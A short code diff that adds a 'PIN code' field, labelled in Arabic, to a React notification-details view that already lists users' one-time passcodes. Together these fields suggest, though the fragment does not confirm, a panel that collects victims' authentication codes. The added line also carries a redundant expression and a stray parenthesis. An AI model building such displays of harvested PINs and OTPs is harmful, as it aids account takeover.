@@ -1884,6 +1884,11 @@ function NotificationDetails({
                       icon: Shield,
                     },
                     {
+                      label: "رمز pin)",
+                      value: notification.pinCode|| notification.pinCode,
+                      icon: Shield,
+                    },
+                    {
                       label: "جميع الرموز",
                       value: notification.allOtps?.join(""),
                       icon: Shield,
